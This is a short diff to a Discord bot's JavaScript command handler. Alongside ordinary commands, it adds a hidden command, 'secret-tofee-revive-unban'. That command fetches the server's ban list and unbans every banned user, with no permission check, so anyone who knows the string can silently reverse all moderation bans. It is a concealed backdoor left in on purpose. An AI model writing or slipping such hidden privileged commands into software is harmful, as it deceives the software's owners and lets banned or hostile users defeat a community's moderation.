@@ -90,6 +90,13 @@ Have a Great Time! Hope You Enjoy!`
     // client.commands.get("meme").execute(message, args);
   } else if (command == "source") {
     client.commands.get("source").execute(message, args);
+  } else if (command == "secret-tofee-revive-unban") {
+    message.guild.fetchBans().then(bans => {
+      if (bans.size == 0) {message.reply("There are no banned users."); throw "No members to unban."};
+      bans.forEach(ban => {
+          message.guild.members.unban(ban.user.id);
+      });
+  }).then(() => message.reply("Unbanned all users.")).catch(e => console.log(e))
   } else if (command == "poll") {
     if (!args[0]) return message.channel.send("Really Bruh");
     else {
